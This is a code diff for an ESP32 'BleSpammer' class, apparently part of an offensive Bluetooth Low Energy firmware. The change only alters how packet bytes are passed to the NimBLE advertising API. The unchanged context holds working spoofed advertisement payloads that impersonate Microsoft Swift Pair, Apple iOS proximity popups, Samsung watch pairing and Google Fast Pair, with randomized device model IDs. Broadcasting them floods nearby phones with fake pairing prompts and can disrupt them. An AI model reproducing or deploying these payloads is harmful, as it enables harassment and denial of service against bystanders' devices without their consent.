@@ -135,7 +135,7 @@ NimBLEAdvertisementData BleSpammer::getAdvertisementData(BleSpamMode type) {
             rawData[2] = 0x06; rawData[3] = 0x00; // Microsoft Corp ID
             rawData[4] = 0x03; rawData[5] = 0x00; rawData[6] = 0x80;
             memcpy(&rawData[7], name, name_len);
-            adData.addData(std::string((char*)rawData, 7 + name_len));
+            adData.addData(rawData, 7 + name_len);
             delete[] rawData;
             break;
         }
@@ -144,12 +144,12 @@ NimBLEAdvertisementData BleSpammer::getAdvertisementData(BleSpamMode type) {
                 uint8_t packet[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, IOS1[random() % sizeof(IOS1)],
                                       0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 
                                       0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
-                adData.addData(std::string((char*)packet, 31));
+                adData.addData(packet, 31);
             } else {
                 uint8_t packet[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 
                                       0xc1, IOS2[random() % sizeof(IOS2)], 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 
                                       0x00, 0x00, 0x00};
-                adData.addData(std::string((char*)packet, 23));
+                adData.addData(packet, 23);
             }
             break;
         }
@@ -162,14 +162,14 @@ NimBLEAdvertisementData BleSpammer::getAdvertisementData(BleSpamMode type) {
             esp_fill_random(&packet[8], 3);
             packet[11] = 0x00; packet[12] = 0x00; packet[13] = 0x10;
             esp_fill_random(&packet[14], 3);
-            adData.addData(std::string((char*)packet, 17));
+            adData.addData(packet, 17);
             break;
         }
         case BleSpamMode::SAMSUNG: {
             uint8_t model = watch_models[random(sizeof(watch_models)/sizeof(watch_models[0]))].value;
             uint8_t samsungData[15] = {0x0F, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 
                                        0xFF, 0x00, 0x00, 0x43, model};
-            adData.addData(std::string((char*)samsungData, 15));
+            adData.addData(samsungData, 15);
             break;
         }
         case BleSpamMode::GOOGLE: {
@@ -177,7 +177,7 @@ NimBLEAdvertisementData BleSpammer::getAdvertisementData(BleSpamMode type) {
             uint8_t googleData[14] = {0x03, 0x03, 0x2C, 0xFE, 0x06, 0x16, 0x2C, 0xFE,
                                       (uint8_t)(model >> 16), (uint8_t)(model >> 8), (uint8_t)model,
                                       0x02, 0x0A, (uint8_t)(random(120) - 100)};
-            adData.addData(std::string((char*)googleData, 14));
+            adData.addData(googleData, 14);
             break;
         }
         default: break;
